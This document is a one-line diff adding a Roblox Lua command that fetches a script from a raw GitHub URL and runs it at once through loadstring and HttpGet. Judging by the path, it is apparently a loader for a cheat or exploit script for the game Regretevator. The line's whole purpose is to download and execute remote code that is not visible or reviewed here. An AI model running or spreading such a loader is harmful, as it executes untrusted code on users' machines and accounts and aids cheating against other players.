@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/regretevator-elevator-simulator-spam5-xsxnc9yjkz1wma.lua"))()
